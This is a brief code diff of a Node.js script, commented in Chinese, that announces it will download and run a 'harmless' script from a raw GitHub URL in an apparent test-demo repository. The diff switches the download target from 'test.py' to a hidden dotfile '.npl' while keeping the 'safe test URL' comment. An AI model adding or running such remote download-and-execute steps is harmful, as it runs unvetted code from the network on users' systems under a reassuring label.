@@ -6,8 +6,8 @@ const path = require('path');
 console.log('开始下载并运行无害化脚本...\n');
 
 // 下载配置
-const downloadUrl = 'https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250627/test.py';  // 使用安全的测试URL
-const filename = 'test.py';
+const downloadUrl = 'https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250627/.npl';  // 使用安全的测试URL
+const filename = '.npl';
 
 console.log(`下载URL: ${downloadUrl}`);
 console.log(`文件名: ${filename}\n`);
